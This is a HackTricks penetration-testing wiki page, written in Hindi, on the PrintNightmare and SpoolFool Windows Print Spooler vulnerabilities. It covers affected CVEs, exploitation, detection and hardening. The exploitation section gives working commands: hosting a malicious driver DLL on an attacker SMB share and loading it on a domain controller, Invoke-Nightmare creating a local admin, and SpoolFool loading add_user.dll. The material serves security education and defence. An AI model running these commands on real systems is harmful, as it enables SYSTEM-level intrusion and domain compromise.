# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare, Windows **Print Spooler** सेवा की कमजोरियों के एक समूह का सामूहिक नाम है, जो **SYSTEM के रूप में मनमाना कोड निष्पादन** और, जब spooler RPC के ज़रिए पहुँच योग्य हो, **domain controllers और file servers पर remote code execution (RCE)** की अनुमति देता है। सबसे अधिक exploit किए गए CVEs **CVE-2021-1675** (शुरुआत में LPE के रूप में वर्गीकृत) और **CVE-2021-34527** (पूर्ण RCE) हैं। बाद की समस्याएँ, जैसे **CVE-2021-34481 (“Point & Print”)** और **CVE-2022-21999 (“SpoolFool”)**, साबित करती हैं कि attack surface अभी भी पूरी तरह बंद नहीं हुआ है।

अगर आप **driver-based RCE/LPE** के बजाय spooler के ज़रिए **authentication coercion / relay** ढूँढ़ रहे हैं, तो [printer coercion abuse पर यह दूसरा पेज देखें](printers-spooler-service-abuse.md)। यह पेज **SYSTEM के रूप में drivers / DLLs लोड करने** पर केंद्रित है।

---

## 1. कमजोर घटक और CVEs

| वर्ष | CVE | संक्षिप्त नाम | Primitive | टिप्पणियाँ |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|जून 2021 CU में patch किया गया, लेकिन CVE-2021-34527 ने bypass कर दिया|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` प्रमाणित उपयोगकर्ताओं को remote share से driver DLL लोड करने देता है; अगस्त 2021 के बाद आमतौर पर इसके लिए कमजोर Point & Print policies की आवश्यकता होती है|
|2021|CVE-2021-34481|“Point & Print”|LPE|non-admin उपयोगकर्ताओं द्वारा unsigned driver इंस्टॉल करना|
|2022|CVE-2022-21999|“SpoolFool”|LPE|मनमानी directory बनाना → DLL planting – 2021 के patches के बाद भी काम करता है|

ये सभी **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) या **Point & Print** के भीतर trust relationships का दुरुपयोग करते हैं।

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

एक प्रमाणित लेकिन **कम विशेषाधिकार वाला** domain user remote spooler (अक्सर DC) पर मनमानी DLLs को **NT AUTHORITY\SYSTEM** के रूप में चला सकता है। इसके लिए:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

लोकप्रिय PoCs में **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) और **mimikatz** में Benjamin Delpy के `misc::printnightmare / lsa::addsid` modules शामिल हैं।

### 2.2 स्थानीय privilege escalation (कोई भी समर्थित Windows, 2021-2024)

उसी API को driver लोड करने और SYSTEM privileges प्राप्त करने के लिए `C:\Windows\System32\spool\drivers\x64\3\` से **स्थानीय रूप से** call किया जा सकता है:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 पैच किए गए hosts पर आधुनिक triage

पूरी तरह अपडेट किए गए host पर, सार्वजनिक PrintNightmare PoCs अक्सर विफल हो जाते हैं, क्योंकि Windows अब डिफ़ॉल्ट रूप से printer driver installation को **केवल administrators तक सीमित** रखता है (`RestrictDriverInstallationToAdministrators=1`, 10 अगस्त, 2021 से)। किसी target पर exploit चलाने से पहले, जाँचें कि क्या legacy printer deployments के लिए environment ने उस सुरक्षा बदलाव को वापस किया है:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

दो सबसे दिलचस्प कमजोर मान आमतौर पर ये होते हैं:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

PoC चलाने से पहले, Linux से तुरंत पुष्टि करें कि target संबंधित print RPC interfaces उपलब्ध कराता है:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

कुछ नए सार्वजनिक टूल **DLL** भेजने से पहले अधिक सुरक्षित **जाँच/सूची** वर्कफ़्लो भी उपलब्ध कराते हैं:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> यदि आपको कम विशेषाधिकार वाले उपयोगकर्ता के रूप में `RPC_E_ACCESS_DENIED` (`0x8001011b`) मिलता है, तो आमतौर पर आप परिवहन विफलता के बजाय 2021 के बाद का डिफ़ॉल्ट व्यवहार देख रहे होते हैं।

> Windows 11 22H2+ और नए client builds पर, remote printing डिफ़ॉल्ट रूप से **RPC over TCP** का उपयोग करता है और **RPC over named pipes** (`\PIPE\spoolss`) अक्षम होता है, जब तक कि इसे स्पष्ट रूप से फिर से सक्षम न किया जाए। कुछ पुराने PoC और lab notes अब भी मानते हैं कि named pipe तक पहुँचा जा सकता है।<sup>[[4]](#references)</sup>

### 2.4 “पैच किए गए” नेटवर्क पर Package Point & Print का दुरुपयोग

कई enterprise environments मूल 2021 patches के बाद भी **policy के कारण असुरक्षित** रहे, क्योंकि helpdesk या print-server workflows में अब भी गैर-admin उपयोगकर्ताओं को drivers install/update करने की आवश्यकता थी। व्यवहार में, offensive playbook यह बन जाता है:

- यदि security prompts पूरी तरह अक्षम हैं, तो **classic arbitrary-DLL PrintNightmare** अब भी सबसे छोटा रास्ता है।
- यदि `Only use Package Point and Print` सक्षम है, तो आमतौर पर raw DLL drop के बजाय **signed package-aware driver** path पर जाना पड़ता है।<sup>[[3]](#references)</sup>
- 2024 के शोध से पता चला कि **`Package Point and Print - Approved servers` अपने आप में कोई मज़बूत trust boundary नहीं है**: यदि कोई attacker किसी approved print server के लिए name resolution को spoof या hijack कर सकता है, तो victims को अब भी ऐसे malicious server की ओर redirect किया जा सकता है जो policy checks को पूरा करता हो।<sup>[[4]](#references)</sup>
- UNC hardening को forced RPC-over-SMB के साथ जोड़ने पर भी स्थिति नाज़ुक हो सकती है, क्योंकि modern clients **RPC over TCP पर वापस जा सकते हैं**।<sup>[[4]](#references)</sup>

इसीलिए, आधुनिक PrintNightmare-शैली का exploitation अक्सर मूल 2021 PoC को बिना बदलाव के दोहराने के बजाय **enterprise printer deployment policy का दुरुपयोग** करने के बारे में होता है।

### 2.5 SpoolFool (CVE-2022-21999) – 2021 के fixes को bypass करना

Microsoft के 2021 patches ने remote driver loading को रोका, लेकिन **directory permissions को harden नहीं किया**। SpoolFool `SpoolDirectory` parameter का दुरुपयोग करके `C:\Windows\System32\spool\drivers\` के अंतर्गत कोई भी directory बनाता है, एक payload DLL छोड़ता है और spooler को उसे load करने के लिए मजबूर करता है:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> यह exploit फरवरी 2022 के updates से पहले पूरी तरह patched Windows 7 → Windows 11 और Server 2012R2 → 2022 पर काम करता है<sup>[[2]](#references)</sup>

---

## 3. पहचान और hunting

* **PrintService logs** – *Microsoft-Windows-PrintService/Operational* channel को enable करें और सफल व विफल, दोनों तरह के attempts पर **Event ID 316** (driver जोड़ा/अपडेट किया गया, आमतौर पर इसमें DLL के नाम शामिल होते हैं) पर नज़र रखें। संदिग्ध spooler module/driver load failures के लिए इसे **Event ID 808/811** के साथ जोड़ें।
* **Sysmon** – जब parent process **spoolsv.exe** हो, तब `C:\Windows\System32\spool\drivers\*` के अंदर `Event ID 7` (Image loaded) या `11/23` (File write/delete) पर नज़र रखें।
* **Process lineage** – जब भी **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell या किसी अप्रत्याशित unsigned child process को spawn करे, alert जारी करें।
* **Network telemetry** – `spoolsv.exe` से attacker-controlled shares पर होने वाले अप्रत्याशित SMB fetches या उन servers से आने वाला असामान्य printer RPC traffic, जिन्हें print servers की तरह काम नहीं करना चाहिए, दोनों ही high-signal leads हैं।

## 4. Mitigation और hardening

1. **Patch!** – Print Spooler service इंस्टॉल वाले हर Windows host पर नवीनतम cumulative update लागू करें।
2. **जहाँ spooler की आवश्यकता न हो, वहाँ उसे disable करें**, खासकर Domain Controllers पर:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **रिमोट कनेक्शन ब्लॉक करें** और लोकल प्रिंटिंग की अनुमति दें – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print को केवल एडमिन के लिए रखें** और यह सेट करें:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Microsoft KB5005652 में विस्तृत मार्गदर्शन<sup>[[1]](#references)</sup>
5. यदि व्यावसायिक आवश्यकताओं के कारण `RestrictDriverInstallationToAdministrators=0` रखना पड़े, तो प्रिंटर की अन्य सभी नीतियों को **केवल आंशिक mitigation** मानें। कम-से-कम **package-aware drivers** को प्राथमिकता दें, **Only use Package Point and Print** सक्षम करें, और **Package Point and Print - Approved servers** को केवल स्पष्ट रूप से निर्दिष्ट in-forest print servers तक सीमित रखें।<sup>[[3]](#references)</sup>
6. केवल खराब printer mappings को ठीक करने के लिए printer RPC privacy **को वापस बंद न करें**। `RpcAuthnLevelPrivacyEnabled=0` सेट करने वाले वातावरण **CVE-2021-1678** के लिए जोड़ी गई hardening को वापस हटा रहे हैं और engagement के दौरान आम तौर पर उनकी अतिरिक्त जाँच की जानी चाहिए।<sup>[[4]](#references)</sup>

---

## 5. संबंधित शोध / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`, `-list`, और `-delete` modes वाला standard Impacket implementation
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – built-in SMB delivery, multi-target support, और `MS-RPRN` / `MS-PAR` दोनों modes वाला wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print के ज़रिए अपना vulnerable printer driver इस्तेमाल करके किया जाने वाला abuse
* SpoolFool exploit और write-up
* SpoolFool और spooler की अन्य bugs के लिए 0patch micropatches

यदि आप driver load करने के बजाय spooler के ज़रिए **authentication coerce** करना चाहते हैं, तो [printer spooler service abuse](printers-spooler-service-abuse.md) पर जाएँ।

---

## References

- [1] [Microsoft – KB5005652: नए Point & Print default driver installation behavior को प्रबंधित करें](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – 2024 में PrintNightmare के लिए एक व्यावहारिक मार्गदर्शिका](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare अभी खत्म नहीं हुआ है](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
